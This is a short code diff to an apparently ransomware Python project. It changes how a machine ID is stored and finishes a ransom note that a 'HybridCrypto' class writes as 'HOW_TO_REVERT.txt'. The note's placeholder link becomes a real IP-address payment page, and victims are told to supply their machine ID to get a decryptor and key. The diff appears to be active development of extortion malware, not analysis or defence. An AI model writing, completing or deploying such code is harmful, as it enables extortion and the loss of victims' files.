@@ -12,7 +12,9 @@ FILE = ".machine_id"
 
 def get_machine_id():
     if os.path.exists(FILE):
-        return open(FILE).read().strip()
+        data = open(FILE).read().strip()
+        if data:
+            return data
 
     mid = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
     open(FILE, "w").write(mid)
@@ -123,8 +125,8 @@ class HybridCrypto:
         guide_path = os.path.join(folder, "HOW_TO_REVERT.txt")
         with open(guide_path, "w") as f:
             f.write("How to Decrypt Files:\n")
-            f.write("1. Access the link http://--FIX--\n")
-            f.write("2. Provide the machine ID found in 'machine_id.txt'\n")
+            f.write("1. Access the link http://13.237.202.163/pay.html\n")
+            f.write("2. Provide the machine ID found in '.machine_id'\n")
             f.write("3. Get .exe file + KEY.pem. Copy them to the same folder\n")
             f.write("4. Run the .exe + directory of encrypted files as argument\n")
             f.write("GOOD LUCK!")
